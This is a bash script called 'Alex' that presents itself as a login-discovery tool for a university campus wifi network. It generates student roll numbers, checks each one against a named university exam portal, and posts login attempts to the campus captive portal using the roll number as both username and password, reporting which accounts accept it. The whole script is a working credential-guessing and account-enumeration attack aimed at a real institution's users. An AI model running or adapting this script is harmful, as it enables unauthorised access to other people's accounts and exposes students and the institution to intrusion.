echo "   #                         "
echo "  # #   #      ###### #    # "
echo " #   #  #      #       #  #  "
echo "#     # #      #####    ##   "
echo "####### #      #        ##   "
echo "#     # #      #       #  #  "
echo "#     # ###### ###### #    # "

echo "                             Version 1.0"
echo "Alex is a simple Log in discovery Program for Wifi Login's"
echo "in the campus wifi Network"
echo "Note: Alex can only discover the usernames whose password is"
echo "same as username.."
echo
#echo -n "If you wish to continue the scan [Y/N]:"
#read op
#if [[ $op != "y" && $op != "Y" ]]
#then
#	exit 0
#fi

#echo -n "Enter Branch code [05-CSE|15-CSSE]:"
branch=15
#echo -n "Enter Year Code Series[Like 17 | 18 | etc]:"
year=17
echo "Scan Started........"
roll=$year"121a"
roll_no=1
roll_dig=1
chr=97
rollnumber=default
while true
do
	if [[ $roll_no -lt 10 ]]
	then
		rollnumber="$roll$branch"0"$roll_no"
	elif [[ $roll_no -le 99 ]]
	then
		rollnumber="$roll$branch$roll_no"
	else
		code=$(printf "\x$(printf %x $chr)")
		rollnumber="$roll$branch$code$roll_dig"
		roll_dig=`expr $roll_dig + 1`
		if [[ $roll_dig -eq 10 ]]; then
			roll_dig=0
			chr=`expr $chr + 1`
		fi
	fi
	roll_no=`expr $roll_no + 1`
	a=$(curl --silent examsportal.vidyanikethan.edu/verify/getRecord.asp?htno=$rollnumber | wc -w)
	if [[ $a -eq 125 ]]
	then
		break
	else
		curl -s 10.10.0.252:8090/login.xml -d "mode=191&username=$rollnumber&password=$rollnumber&a=1580903190048&producttype=0" | grep "You have successfully logged in" > /dev/null
		a=$?
		curl -s 10.10.0.252:8090/login.xml -d "mode=191&username=$rollnumber&password=$rollnumber&a=1580903190048&producttype=0" | grep "You have reached Maximum Login Limit" > /dev/null
		b=$?
		if [ $a -eq 0 ]
		then
			echo "$rollnumber  Not logged in"
		elif [[ $b -eq 0 ]]
		then
			echo "$rollnumber  Logged in"
		fi
	fi
done
echo "Scan Completed......."
